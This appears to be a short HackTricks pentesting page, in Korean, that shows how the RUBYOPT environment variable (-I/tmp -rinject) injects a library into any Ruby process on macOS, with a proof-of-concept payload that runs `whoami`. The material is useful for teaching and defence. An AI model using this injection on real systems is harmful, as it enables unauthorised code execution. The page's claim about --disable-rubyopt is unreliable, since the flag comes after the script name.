# macOS Ruby Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## RUBYOPT

이 env variable을 사용하면 **ruby**가 실행될 때마다 **새로운 params를 추가**할 수 있습니다. **`-e`** param을 사용해 실행할 ruby code를 지정할 수는 없지만, **`-I`** 및 **`-r`** params를 사용하여 libraries load path에 새로운 폴더를 추가한 다음 **load할 library를 지정**할 수 있습니다.

**`/tmp`**에 **`inject.rb`** library를 생성합니다:
```ruby:inject.rb
puts `whoami`
```
다음과 같은 Ruby script를 아무 곳에나 생성합니다:
```ruby:hello.rb
puts 'Hello, World!'
```
그런 다음 임의의 Ruby script에서 이를 load하도록 합니다:
```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb
```
재미있는 사실: **`--disable-rubyopt`** param을 사용해도 작동합니다:
```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb --disable-rubyopt
```
{{#include ../../../banners/hacktricks-training.md}}
